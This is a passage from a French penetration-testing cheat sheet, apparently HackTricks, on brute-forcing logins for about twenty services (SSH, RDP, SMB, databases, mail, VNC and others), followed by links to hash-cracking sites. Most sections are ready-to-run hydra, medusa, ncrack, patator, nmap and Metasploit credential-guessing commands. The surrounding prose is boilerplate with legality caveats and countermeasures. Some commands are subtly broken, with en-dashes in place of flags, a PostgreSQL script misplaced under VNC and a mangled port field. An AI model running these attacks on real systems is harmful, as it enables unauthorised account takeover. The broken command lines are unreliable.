hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql
```
# Brute Force

La méthode de force brute est une technique couramment utilisée en piratage pour tenter de deviner un mot de passe en essayant toutes les combinaisons possibles jusqu'à ce que la bonne soit trouvée. Cette méthode est souvent utilisée lorsque d'autres méthodes, telles que l'ingénierie sociale ou l'utilisation de logiciels malveillants, ne sont pas efficaces.

La force brute peut être utilisée pour attaquer différents types de systèmes, y compris les bases de données OracleSQL. L'objectif est de trouver le mot de passe d'un utilisateur afin de pouvoir accéder à la base de données et extraire des informations sensibles.

Il existe plusieurs outils disponibles pour effectuer des attaques de force brute sur OracleSQL, tels que Hydra et Metasploit. Ces outils automatisent le processus en essayant différentes combinaisons de mots de passe à une vitesse élevée.

Il est important de noter que l'utilisation de la force brute pour accéder à un système sans autorisation est illégale et peut entraîner des conséquences juridiques graves. Il est donc essentiel de toujours obtenir une autorisation légale avant de procéder à des tests de pénétration ou à des activités de piratage éthique.

Pour se protéger contre les attaques de force brute, il est recommandé d'utiliser des mots de passe forts et uniques pour chaque compte, de mettre en place des politiques de verrouillage des comptes après un certain nombre de tentatives infructueuses et de surveiller les journaux d'activité pour détecter toute activité suspecte.
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
```
Pour utiliser **oracle\_login** avec **patator**, vous devez **installer** :
```bash
pip3 install cx_Oracle --upgrade
```
[Bruteforce du hash OracleSQL hors ligne](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** et **11.2.0.3**) :
```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
### POP

Le protocole POP (Post Office Protocol) est un protocole utilisé pour récupérer les e-mails à partir d'un serveur de messagerie. Il est couramment utilisé pour accéder aux boîtes aux lettres électroniques à l'aide de clients de messagerie tels que Microsoft Outlook.

#### Attaque par force brute

L'attaque par force brute est une méthode utilisée pour tenter de deviner un mot de passe en essayant toutes les combinaisons possibles jusqu'à ce que la bonne soit trouvée. Dans le contexte du protocole POP, une attaque par force brute peut être utilisée pour essayer de deviner le mot de passe d'un compte de messagerie POP en essayant différentes combinaisons de mots de passe.

#### Méthodologie

1. Identifier la cible : déterminer l'adresse IP du serveur de messagerie POP cible.

2. Collecte d'informations : recueillir des informations sur la cible, telles que les noms d'utilisateur possibles et les mots de passe couramment utilisés.

3. Configuration de l'outil de force brute : configurer un outil de force brute tel que Hydra pour effectuer l'attaque.

4. Lancement de l'attaque : lancer l'attaque en utilisant l'outil de force brute pour essayer différentes combinaisons de mots de passe.

5. Analyse des résultats : analyser les résultats de l'attaque pour déterminer si le mot de passe a été trouvé avec succès.

6. Post-exploitation : une fois le mot de passe trouvé, accéder à la boîte aux lettres électronique cible et effectuer les actions nécessaires, telles que la récupération des e-mails.

#### Contre-mesures

Pour se protéger contre les attaques par force brute sur les serveurs POP, il est recommandé de prendre les mesures suivantes :

- Utiliser des mots de passe forts et uniques pour les comptes de messagerie POP.

- Mettre en place des politiques de verrouillage de compte après un certain nombre de tentatives de connexion infructueuses.

- Utiliser des outils de détection d'intrusion pour surveiller les activités suspectes sur le serveur POP.

- Mettre à jour régulièrement le serveur de messagerie POP avec les derniers correctifs de sécurité.

En suivant ces contre-mesures, il est possible de réduire considérablement le risque d'une attaque par force brute réussie sur un serveur POP.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V
```
### PostgreSQL

PostgreSQL est un système de gestion de base de données relationnelle open source. Il est largement utilisé dans les applications web et est connu pour sa fiabilité, sa robustesse et sa conformité aux normes SQL. PostgreSQL prend en charge de nombreuses fonctionnalités avancées telles que les transactions ACID, les vues matérialisées, les index fonctionnels et les procédures stockées.

Lorsqu'il s'agit de tester la sécurité d'une application utilisant PostgreSQL, une technique couramment utilisée est la force brute. La force brute consiste à essayer toutes les combinaisons possibles de mots de passe jusqu'à ce que le bon soit trouvé. Cela peut être fait en utilisant des outils spécifiques tels que Hydra ou en écrivant un script personnalisé.

La force brute peut être une méthode efficace pour trouver des mots de passe faibles ou mal configurés. Cependant, elle peut être lente et consommer beaucoup de ressources, en particulier si le mot de passe recherché est complexe. Il est donc important de prendre en compte ces facteurs lors de l'utilisation de cette technique.

Il convient de noter que la force brute est une méthode d'attaque illégale et non éthique, sauf si elle est effectuée dans le cadre d'un test de pénétration autorisé. Il est essentiel de respecter les lois et les réglementations en vigueur et d'obtenir une autorisation appropriée avant d'entreprendre toute activité de piratage.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
```
### PPTP

Vous pouvez télécharger le package `.deb` à installer depuis [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
### RDP

RDP (Remote Desktop Protocol) est un protocole de communication utilisé pour accéder à distance à un ordinateur. Il permet à un utilisateur de se connecter à un ordinateur distant et d'interagir avec lui comme s'il était physiquement présent devant lui.

Le brute-forcing RDP est une technique utilisée pour tenter de deviner les identifiants de connexion RDP en essayant différentes combinaisons de noms d'utilisateur et de mots de passe. Cette méthode est souvent utilisée par les attaquants pour accéder illégalement à des systèmes distants.

Il existe plusieurs outils disponibles pour effectuer des attaques de brute-forcing RDP, tels que Hydra, Medusa et Crowbar. Ces outils automatisent le processus de tentative de connexion en utilisant une liste de noms d'utilisateur et de mots de passe préalablement collectés ou générés.

Il est important de noter que le brute-forcing RDP est une activité illégale, sauf si elle est effectuée dans le cadre d'un test d'intrusion autorisé. Les professionnels de la sécurité utilisent cette technique pour évaluer la sécurité des systèmes et identifier les vulnérabilités potentielles.
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
```
### Redis

Redis est une base de données en mémoire open-source qui peut être utilisée comme cache, système de messagerie et stockage de données clé-valeur. Il est connu pour sa haute performance et sa simplicité d'utilisation.

#### Attaque par force brute

L'attaque par force brute est une technique utilisée pour tenter de deviner un mot de passe ou une clé en essayant toutes les combinaisons possibles jusqu'à ce que la bonne soit trouvée. Cette méthode est souvent utilisée lorsque les autres méthodes d'attaque, telles que l'ingénierie sociale ou l'exploitation de vulnérabilités, ont échoué.

Dans le contexte de Redis, une attaque par force brute peut être utilisée pour tenter de deviner le mot de passe d'un serveur Redis protégé par un mot de passe. L'attaquant essaiera différentes combinaisons de mots de passe jusqu'à ce qu'il trouve le bon.

Il existe plusieurs outils disponibles pour mener des attaques par force brute contre Redis, tels que Hydra et Medusa. Ces outils automatisent le processus en essayant différentes combinaisons de mots de passe à une vitesse élevée.

Pour se protéger contre les attaques par force brute, il est recommandé de choisir un mot de passe fort et complexe pour le serveur Redis. De plus, il est conseillé de limiter l'accès au serveur en utilisant des listes de contrôle d'accès et en configurant correctement les pare-feu pour bloquer les adresses IP suspectes.

Il est également important de surveiller les journaux d'activité du serveur Redis pour détecter toute activité suspecte ou tentative d'attaque par force brute. En cas de détection d'une telle activité, des mesures de sécurité supplémentaires doivent être prises pour protéger le serveur et les données qu'il contient.
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
```
### Rexec

Le protocole Rexec (Remote Execution) est un protocole de communication utilisé pour exécuter des commandes à distance sur un système distant. Il permet à un utilisateur distant de se connecter à un serveur distant et d'exécuter des commandes sur ce serveur en utilisant son propre compte d'utilisateur.

Le protocole Rexec utilise généralement le port 512 pour la communication. Lorsqu'un utilisateur se connecte à un serveur distant via Rexec, il est invité à fournir ses informations d'identification (nom d'utilisateur et mot de passe) pour s'authentifier.

Une fois authentifié, l'utilisateur peut exécuter des commandes sur le serveur distant. Cependant, il convient de noter que le protocole Rexec n'offre pas de chiffrement des données, ce qui signifie que toutes les informations transmises entre le client et le serveur sont envoyées en clair. Par conséquent, il est recommandé d'utiliser des méthodes de chiffrement supplémentaires, telles que SSH, pour sécuriser la communication.

Les attaquants peuvent utiliser des techniques de force brute pour tenter de deviner les informations d'identification d'un utilisateur et accéder illégalement à un serveur distant via Rexec. Cela peut être réalisé en utilisant des outils automatisés qui essaient différentes combinaisons de noms d'utilisateur et de mots de passe jusqu'à ce qu'ils trouvent les bonnes informations d'identification.

Pour se protéger contre les attaques par force brute sur Rexec, il est recommandé de mettre en place des mesures de sécurité telles que l'utilisation de mots de passe forts, la limitation du nombre de tentatives de connexion, la surveillance des journaux d'activité et l'utilisation de méthodes d'authentification supplémentaires, telles que l'authentification à deux facteurs.
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

Le protocole Rlogin (Remote Login) est un protocole de communication utilisé pour se connecter à distance à un système Unix. Il permet aux utilisateurs d'accéder à une machine distante et d'exécuter des commandes à partir de leur propre terminal.

Le protocole Rlogin utilise un mécanisme d'authentification basé sur un nom d'utilisateur et un mot de passe. Cependant, il est connu pour être vulnérable aux attaques par force brute, où un attaquant tente de deviner le mot de passe en essayant différentes combinaisons.

Les attaques par force brute contre le protocole Rlogin peuvent être effectuées à l'aide d'outils spécifiques, tels que Hydra ou Medusa, qui automatisent le processus de deviner les mots de passe en testant différentes combinaisons à grande vitesse.

Pour se protéger contre les attaques par force brute, il est recommandé de prendre les mesures suivantes :

- Utiliser des mots de passe forts et uniques pour chaque compte utilisateur.
- Mettre en place des politiques de verrouillage des comptes après un certain nombre de tentatives de connexion infructueuses.
- Utiliser des outils de détection d'intrusion pour surveiller les tentatives d'attaques par force brute.
- Mettre en place des pare-feu pour limiter l'accès au protocole Rlogin depuis des adresses IP spécifiques.

En suivant ces bonnes pratiques de sécurité, vous pouvez réduire considérablement les risques d'attaques par force brute contre le protocole Rlogin.
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh

Le Rsh (Remote Shell) est un protocole de communication qui permet d'exécuter des commandes sur un ordinateur distant. Il est souvent utilisé pour l'administration à distance des systèmes Unix. Cependant, en raison de ses vulnérabilités de sécurité, il est généralement déconseillé d'utiliser le Rsh.

L'une des attaques courantes utilisant le Rsh est l'attaque par force brute. Cette attaque consiste à essayer toutes les combinaisons possibles de mots de passe jusqu'à ce que le bon soit trouvé. Les attaquants utilisent souvent des dictionnaires de mots de passe pour automatiser ce processus.

Pour se protéger contre les attaques par force brute, il est recommandé de désactiver le Rsh et de mettre en place des mesures de sécurité telles que des politiques de mots de passe solides, des verrouillages de compte après un certain nombre de tentatives infructueuses et des mécanismes de détection d'intrusion pour détecter les activités suspectes.
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

Rsync est un outil de synchronisation de fichiers qui permet de copier et de synchroniser des données entre des systèmes distants. Il est couramment utilisé pour effectuer des sauvegardes, des mises à jour de fichiers et des transferts de données. Rsync utilise un algorithme de transfert de fichiers efficace qui ne transfère que les parties modifiées des fichiers, ce qui permet de réduire la quantité de données transférées et d'accélérer le processus de synchronisation.

Lorsqu'il est utilisé dans le contexte du piratage éthique, Rsync peut être utilisé pour rechercher des vulnérabilités dans les systèmes distants. Une technique courante consiste à utiliser une attaque par force brute pour deviner les mots de passe des comptes Rsync. Cette méthode implique de tester de manière itérative différentes combinaisons de mots de passe jusqu'à ce que le mot de passe correct soit trouvé. Cette approche peut être efficace si le mot de passe est faible ou si des techniques de hachage faibles sont utilisées.

Il est important de noter que l'utilisation de techniques de force brute pour accéder à des systèmes distants sans autorisation est illégale et peut entraîner des conséquences juridiques graves. Les techniques de force brute doivent être utilisées uniquement dans le cadre d'un test de pénétration autorisé et avec le consentement écrit du propriétaire du système cible.
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP

Le protocole RTSP (Real Time Streaming Protocol) est un protocole de communication utilisé pour le streaming en temps réel de données multimédias, telles que l'audio et la vidéo, sur des réseaux IP. Il permet aux clients de contrôler la lecture des médias, tels que la lecture, la pause, l'avance rapide et le retour en arrière, en communiquant avec le serveur de streaming.

Le protocole RTSP utilise généralement le port 554 pour la communication. Il fonctionne en établissant une session entre le client et le serveur, où le client envoie des commandes RTSP pour contrôler la lecture des médias. Le serveur répond ensuite avec des réponses RTSP pour indiquer l'état de la lecture ou pour effectuer des actions demandées par le client.

L'une des méthodes d'attaque courantes utilisées contre les serveurs RTSP est l'attaque par force brute. Cette technique consiste à essayer de deviner les identifiants de connexion en testant différentes combinaisons de noms d'utilisateur et de mots de passe. Les attaquants utilisent souvent des dictionnaires de mots de passe couramment utilisés ou des techniques d'ingénierie sociale pour tenter de compromettre les serveurs RTSP.

Pour se protéger contre les attaques par force brute, il est recommandé d'utiliser des identifiants de connexion forts, tels que des mots de passe complexes et uniques, et de mettre en place des mesures de sécurité supplémentaires, telles que le blocage des adresses IP après un certain nombre de tentatives infructueuses de connexion.
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SNMP

Le protocole SNMP (Simple Network Management Protocol) est un protocole largement utilisé pour la gestion et la surveillance des réseaux. Il permet aux administrateurs réseau de collecter des informations sur les périphériques réseau, tels que les routeurs, les commutateurs et les serveurs, ainsi que de configurer et de contrôler ces périphériques à distance.

Le SNMP utilise un modèle client-serveur, où les périphériques réseau agissent en tant que serveurs SNMP et les applications de gestion réseau agissent en tant que clients SNMP. Les clients SNMP envoient des requêtes aux serveurs SNMP pour obtenir des informations sur les périphériques réseau, tandis que les serveurs SNMP répondent à ces requêtes en fournissant les informations demandées.

Une des méthodes couramment utilisées pour attaquer les réseaux est l'attaque par force brute sur le SNMP. Cette attaque consiste à essayer toutes les combinaisons possibles de noms d'utilisateur et de mots de passe pour accéder aux périphériques réseau via SNMP. Les attaquants utilisent des outils automatisés pour générer et tester ces combinaisons à grande vitesse, dans l'espoir de trouver des identifiants valides et d'accéder aux périphériques.

Pour se protéger contre les attaques par force brute sur le SNMP, il est recommandé de prendre les mesures suivantes :

- Utiliser des noms d'utilisateur et des mots de passe forts pour les périphériques réseau.
- Limiter l'accès SNMP aux adresses IP autorisées uniquement.
- Mettre en place des mécanismes de détection d'intrusion pour détecter les tentatives d'attaque par force brute.
- Mettre à jour régulièrement les périphériques réseau avec les derniers correctifs de sécurité pour éviter les vulnérabilités connues.

En suivant ces bonnes pratiques de sécurité, les administrateurs réseau peuvent réduire considérablement les risques d'attaque par force brute sur le SNMP et protéger leurs réseaux contre les intrusions non autorisées.
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB

SMB (Server Message Block) est un protocole de partage de fichiers et d'impression utilisé par les systèmes d'exploitation Windows. Il permet aux utilisateurs d'accéder et de partager des fichiers et des imprimantes sur un réseau local. Cependant, en raison de certaines vulnérabilités, SMB peut être exploité par des attaquants pour accéder illégalement à des ressources réseau.

L'une des méthodes couramment utilisées pour attaquer SMB est l'attaque par force brute. Cette technique consiste à essayer toutes les combinaisons possibles de noms d'utilisateur et de mots de passe jusqu'à ce que la bonne combinaison soit trouvée. Les attaquants utilisent souvent des outils automatisés pour effectuer cette attaque, ce qui leur permet de tester rapidement de nombreuses combinaisons.

Pour se protéger contre les attaques par force brute sur SMB, il est recommandé de prendre les mesures suivantes :

- Utiliser des mots de passe forts : choisissez des mots de passe longs et complexes, comprenant des lettres majuscules et minuscules, des chiffres et des caractères spéciaux.
- Limiter les tentatives de connexion : configurez votre système pour bloquer temporairement les adresses IP après un certain nombre de tentatives de connexion infructueuses.
- Mettre à jour régulièrement : assurez-vous que votre système d'exploitation et vos logiciels sont à jour avec les derniers correctifs de sécurité pour éviter les vulnérabilités connues.

En suivant ces bonnes pratiques, vous pouvez renforcer la sécurité de votre réseau et réduire les risques d'attaque par force brute sur SMB.
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
```
### SMTP

Le protocole SMTP (Simple Mail Transfer Protocol) est un protocole de communication utilisé pour l'envoi de courriers électroniques sur Internet. Il est couramment utilisé par les serveurs de messagerie pour transférer les courriers électroniques d'un serveur à un autre.

#### Attaque par force brute SMTP

L'attaque par force brute SMTP est une technique utilisée pour tenter de deviner les identifiants de connexion d'un serveur de messagerie en essayant différentes combinaisons de noms d'utilisateur et de mots de passe. Cette attaque peut être réalisée à l'aide d'outils automatisés qui testent de manière répétée différentes combinaisons jusqu'à ce qu'une correspondance réussie soit trouvée.

#### Méthodologie de l'attaque par force brute SMTP

1. Collecte d'informations : Obtenez des informations sur le serveur de messagerie cible, telles que l'adresse IP, le nom de domaine et les ports utilisés.

2. Identification des utilisateurs : Identifiez les utilisateurs valides du serveur de messagerie en utilisant des techniques telles que l'exploration de répertoires, la recherche d'adresses e-mail publiques ou l'utilisation d'outils de collecte d'informations.

3. Sélection des mots de passe : Utilisez des listes de mots de passe couramment utilisés, des dictionnaires de mots ou des générateurs de mots de passe pour créer une liste de mots de passe à tester.

4. Lancement de l'attaque : Utilisez un outil automatisé pour envoyer des requêtes SMTP au serveur de messagerie cible en utilisant différentes combinaisons de noms d'utilisateur et de mots de passe.

5. Analyse des résultats : Analysez les réponses du serveur de messagerie pour déterminer si une correspondance réussie a été trouvée. Si une correspondance est trouvée, les identifiants de connexion valides peuvent être utilisés pour accéder au compte de messagerie.

#### Contre-mesures

Pour se protéger contre les attaques par force brute SMTP, il est recommandé de prendre les mesures suivantes :

- Utiliser des mots de passe forts et uniques pour les comptes de messagerie.
- Mettre en place des politiques de verrouillage de compte après un certain nombre de tentatives de connexion infructueuses.
- Mettre en œuvre des mécanismes de détection d'intrusion pour détecter et bloquer les attaques par force brute.
- Mettre à jour régulièrement les serveurs de messagerie avec les derniers correctifs de sécurité.
- Surveiller les journaux d'activité du serveur de messagerie pour détecter toute activité suspecte.
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
```
### SOCKS

SOCKS (Socket Secure) est un protocole de réseau qui permet aux utilisateurs d'établir une connexion sécurisée à travers un pare-feu ou un proxy. Il est couramment utilisé pour contourner les restrictions de réseau et accéder à des ressources en ligne restreintes.

L'attaque par force brute SOCKS consiste à essayer toutes les combinaisons possibles de mots de passe pour accéder à un serveur SOCKS. Cette méthode est souvent utilisée lorsque le serveur ne limite pas le nombre de tentatives de connexion ou lorsque les mots de passe sont faibles et faciles à deviner.

Pour mener une attaque par force brute SOCKS, vous pouvez utiliser des outils tels que Hydra ou Medusa, qui automatisent le processus de test de toutes les combinaisons de mots de passe. Ces outils peuvent être configurés pour utiliser une liste de mots de passe courants ou générer des mots de passe aléatoires.

Il est important de noter que l'attaque par force brute SOCKS est une activité illégale et non éthique, sauf si elle est effectuée dans le cadre d'un test de pénétration autorisé. L'utilisation de cette méthode sans autorisation peut entraîner des conséquences juridiques graves.
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
```
### SSH

SSH (Secure Shell) est un protocole de réseau sécurisé qui permet d'établir une connexion cryptée entre un client et un serveur. Il est couramment utilisé pour l'accès à distance aux systèmes Unix et Linux. SSH utilise une paire de clés (une clé privée et une clé publique) pour authentifier le client et le serveur, et chiffre toutes les données échangées entre eux.

#### Brute Force SSH

La méthode de force brute SSH est une technique utilisée pour tenter de deviner les informations d'identification d'un compte SSH en essayant différentes combinaisons de noms d'utilisateur et de mots de passe. Cette méthode est souvent utilisée par les attaquants pour accéder illégalement à des systèmes distants.

Pour effectuer une attaque de force brute SSH, un attaquant utilise un programme automatisé qui tente de se connecter au serveur SSH en utilisant une liste de noms d'utilisateur et de mots de passe préalablement collectés ou générés. L'attaquant peut également utiliser des dictionnaires de mots de passe couramment utilisés pour augmenter les chances de succès.

Il est important de noter que la méthode de force brute SSH est une attaque très lente et bruyante, car elle nécessite de nombreuses tentatives de connexion infructueuses. Les administrateurs système peuvent détecter et bloquer ces attaques en surveillant les journaux d'authentification SSH et en mettant en place des mesures de sécurité telles que la limitation du nombre de tentatives de connexion et l'utilisation de clés d'authentification plutôt que de mots de passe.

Pour se protéger contre les attaques de force brute SSH, il est recommandé d'utiliser des mots de passe forts et uniques pour les comptes SSH, de désactiver l'authentification par mot de passe et de mettre en place des mesures de sécurité supplémentaires telles que l'authentification à deux facteurs.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
```
#### Clés SSH faibles / PRNG prévisible de Debian
Certains systèmes présentent des failles connues dans la graine aléatoire utilisée pour générer du matériel cryptographique. Cela peut entraîner une réduction considérable de l'espace des clés, qui peut être soumis à une attaque par force brute à l'aide d'outils tels que [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Des ensembles prégénérés de clés faibles sont également disponibles, tels que [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

### Serveur SQL
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
Telnet is a protocol used for remote access to computers over a network. It allows users to log in to a remote system and execute commands as if they were directly connected to it. Telnet is often used for administrative purposes, such as configuring network devices or troubleshooting issues.

However, Telnet is considered to be insecure because it transmits data, including usernames and passwords, in plain text. This means that an attacker who can intercept the network traffic can easily capture sensitive information.

One common method used to exploit Telnet is brute force attacks. In a brute force attack, an attacker systematically tries all possible combinations of usernames and passwords until the correct one is found. This can be done manually or with the help of automated tools.

To protect against brute force attacks on Telnet, it is recommended to disable Telnet and use more secure alternatives, such as SSH (Secure Shell). SSH encrypts the data transmitted between the client and the server, making it much more difficult for an attacker to intercept and decipher the information.

In conclusion, Telnet is a protocol that allows remote access to computers, but it is insecure due to its lack of encryption. Brute force attacks are a common method used to exploit Telnet, but they can be mitigated by disabling Telnet and using more secure alternatives like SSH.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet
```
### VNC

VNC (Virtual Network Computing) est un protocole qui permet d'accéder et de contrôler à distance un ordinateur. Il est souvent utilisé pour l'administration à distance, le support technique et la collaboration. Le protocole VNC fonctionne en transmettant les images de l'écran de l'ordinateur distant vers l'ordinateur local, et en envoyant les entrées de l'ordinateur local vers l'ordinateur distant.

#### Brute-Force sur VNC

Le brute-force est une technique couramment utilisée pour tenter de deviner les mots de passe faibles ou mal sécurisés. Lorsqu'il est appliqué à VNC, le brute-force consiste à essayer de deviner le mot de passe d'un serveur VNC en testant différentes combinaisons de mots de passe jusqu'à ce que le bon soit trouvé.

Pour effectuer une attaque de brute-force sur VNC, vous pouvez utiliser des outils spécifiques tels que Hydra ou Medusa. Ces outils permettent de tester rapidement de nombreuses combinaisons de mots de passe en utilisant des dictionnaires prédéfinis ou des listes de mots de passe couramment utilisés.

Il est important de noter que le brute-force est une méthode d'attaque lente et bruyante, qui peut être détectée par les systèmes de détection d'intrusion. Par conséquent, il est recommandé d'utiliser des mesures de sécurité supplémentaires, telles que des mots de passe forts et des mécanismes de verrouillage après un certain nombre de tentatives infructueuses, pour protéger les serveurs VNC contre les attaques de brute-force.

#### Prévention des attaques de brute-force sur VNC

Pour prévenir les attaques de brute-force sur VNC, il est recommandé de prendre les mesures suivantes :

- Utilisez des mots de passe forts et uniques pour les serveurs VNC.
- Limitez l'accès aux serveurs VNC en utilisant des listes blanches d'adresses IP autorisées.
- Mettez en place des mécanismes de verrouillage après un certain nombre de tentatives infructueuses.
- Utilisez des outils de détection d'intrusion pour surveiller les tentatives d'attaque de brute-force.
- Mettez à jour régulièrement les serveurs VNC avec les derniers correctifs de sécurité.

En suivant ces bonnes pratiques de sécurité, vous pouvez réduire considérablement les risques d'attaque de brute-force sur vos serveurs VNC.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm

Winrm (Windows Remote Management) est un protocole de gestion à distance pour les systèmes d'exploitation Windows. Il permet aux administrateurs de contrôler et de gérer à distance les ordinateurs Windows via une interface en ligne de commande.

L'attaque par force brute est une technique couramment utilisée pour tenter de deviner les mots de passe d'un compte Winrm. Cette méthode consiste à essayer différentes combinaisons de mots de passe jusqu'à ce que le bon soit trouvé. Les attaquants utilisent souvent des dictionnaires de mots de passe couramment utilisés ou génèrent des mots de passe aléatoires pour mener cette attaque.

Il est important de noter que l'attaque par force brute peut être une méthode lente et consommatrice de ressources, car elle nécessite de tester de nombreuses combinaisons de mots de passe. De plus, les systèmes de sécurité peuvent détecter et bloquer les tentatives d'attaque par force brute, ce qui rend cette méthode moins efficace.

Pour se protéger contre les attaques par force brute, il est recommandé d'utiliser des mots de passe forts et uniques pour les comptes Winrm. Il est également conseillé de mettre en place des mesures de sécurité supplémentaires, telles que le verrouillage du compte après un certain nombre de tentatives infructueuses de connexion.

En résumé, Winrm est un protocole de gestion à distance pour les systèmes d'exploitation Windows, et l'attaque par force brute est une méthode courante utilisée pour tenter de deviner les mots de passe des comptes Winrm. Il est important de prendre des mesures de sécurité appropriées pour se protéger contre cette attaque.
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Utilisez [**Trickest**](https://trickest.io/) pour construire facilement et **automatiser des flux de travail** alimentés par les outils communautaires les plus avancés au monde.
Obtenez un accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Local

### Bases de données de craquage en ligne

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 et SHA1)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, captures WPA2 et archives MSOffice, ZIP, PDF...)
* [https://crackstation.net/](https://crackstation.net) (Hashes)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (Hashes et hash de fichiers)
* [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
* [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

